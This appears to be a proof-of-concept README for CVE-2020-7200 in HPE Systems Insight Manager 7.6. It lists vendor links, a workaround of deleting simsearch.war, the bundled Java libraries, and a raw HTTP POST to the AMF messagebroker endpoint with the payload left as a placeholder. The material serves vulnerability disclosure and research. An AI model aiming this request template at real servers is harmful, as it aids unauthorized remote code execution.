# CVE-2020-7200

Download HPE SIM 7.6: https://support.hpe.com/hpesc/public/docDisplay?docId=emr_na-c05350303#N10011

Details: https://support.hpe.com/hpesc/public/docDisplay?docLocale=en_US&docId=hpesbgn04068en_us

🎞 Video: https://www.youtube.com/watch?v=QNhcNJtjKyw

HPE does not provide a patch but only for a temporary fix simply delete simsearch.war in ```C:\Program Files\HP\Systems Insight Manager\jboss\server\hpsim\deploy\simsearch.war```, so this means This is the main cause of this vulnerability!

```
Program Files\HP\Systems Insight Manager\jboss\server\hpsim\deploy\simsearch.war
└───WEB-INF
    │
    └───lib
            axis-1.4.jar
            backport-util-concurrent.jar
            cfgatewayadapter.jar
            commons-codec-1.3.jar
            commons-httpclient-3.0.1.jar
            commons-logging.jar
            concurrent.jar
            flex-messaging-common.jar
            flex-messaging-core.jar
            flex-messaging-opt.jar
            flex-messaging-proxy.jar
            flex-messaging-remoting.jar
            flex-rds-server.jar
            jaxrpc.jar
            simsearch.jar
            xalan.jar
            
Program Files\HP\Systems Insight Manager
└───lib
        jgroups-2.2.1.jar

Program Files\HP\Systems Insight Manager\jboss\server\hpsim
└───lib
        commons-collections.jar
        javassist.jar
```

Start server:

```
C:\Program Files\HP\Systems Insight Manager\lbin>hpsimsvc.exe -console
```

Request:

```
POST /simsearch/messagebroker/amfsecure HTTP/1.1
Host: 127.0.0.1:50000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Lenght: 0

<PAYLOAD>
```
